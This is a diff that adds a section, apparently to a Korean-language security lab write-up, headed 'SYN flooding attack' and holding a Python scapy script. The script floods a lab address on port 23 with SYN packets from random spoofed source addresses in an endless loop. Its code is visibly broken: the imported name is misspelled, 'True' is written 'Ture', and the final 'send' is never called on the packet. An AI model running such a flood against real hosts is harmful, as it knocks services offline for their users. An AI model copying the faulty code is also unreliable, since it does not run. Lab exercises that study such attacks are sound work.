@@ -166,3 +166,22 @@ int main() {
 	}
 ```
 
+# (3) SYN 플러딩 공격
+## Python 프로그램(synflood.py)
+```python
+#!/bin/env python3
+
+from scapy.all import IP, TCP, send
+from ipaddress import IPv4Address
+from random import getrandbite
+
+ip = IP(dst="10.0.2.69")
+tcp = TCP(dport=23, flags='S')
+pkt = ip/tcp
+
+while Ture:
+	pkt[IP].src = str(IPv4Address(getrandbites(32)))
+	pkt[TCP].sport = getrandbites(16)
+	pkt[TCP].seq = getrandbites(32)
+	send
+```
